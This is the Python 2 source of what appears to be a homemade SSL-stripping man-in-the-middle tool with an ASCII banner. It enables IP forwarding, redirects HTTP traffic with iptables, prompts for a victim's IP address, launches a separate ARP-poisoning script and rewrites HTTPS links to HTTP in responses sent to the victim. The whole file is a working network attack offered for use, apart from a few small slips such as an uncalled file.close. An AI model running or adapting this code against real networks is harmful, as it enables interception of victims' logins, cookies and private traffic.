import os
from scapy.all import *
import time
import requests

print "                                                               "
print "              _           _        _             _             "
print "      ___ ___| |      ___| |_ _ __(_)_ __  _ __ (_)_ __   __ _ "
print "     / __/ __| |_____/ __| __| '__| | '_ \| '_ \| | '_ \ / _` |"
print "     \__ \__ \ |_____\__ \ |_| |  | | |_) | |_) | | | | | (_| |"
print "     |___/___/_|     |___/\__|_|  |_| .__/| .__/|_|_| |_|\__, |"
print "                                    |_|   |_|            |___/ "
print "                                                               "
print "                              Including secure cookie stripping"
print "                                                               "
print "                                                               "

print "Enabling IP forwarding"
file = open("/proc/sys/net/ipv4/ip_forward", "w")
file.write("1")
file.close()


print "redirecting all http traffic to port 8080"
os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

vIP = raw_input("Victim IP address?")

file = open("vIP.txt", "w+")
file.write(vIP)
file.close

os.system("gnome-terminal -e 'python arpPoison.py' & disown")

#Starting the stripping process

def StrippingHTTPS(url, requestA):

    # Response message for the victim
    responseVictim = requests.models.Response()

    # reponse message url is equal to provided url
    responseVictim.url = url

    # Set HTTPstatuscode to 200 OK
    responseVictim.status_code = 200


    # Replace HTTPS with HTTPS 
    newURL = str(requestA.text).replace("HTTPS", "HTTP")
    newURL = str(newURL).replace("https", "http")

    responseVictim._content = newURL.encode('utf-8')

    responseVictim.headers = requestA.headers
    responseVictim.history = requestA.history
    responseVictim.encoding = requestA.encoding
    responseVictim.reason = requestA.reason
    responseVictim.elapsed = requestA.elapsed
    responseVictim.request = requestA.request

    print "HTTPS was stripped"

    return responseVictim


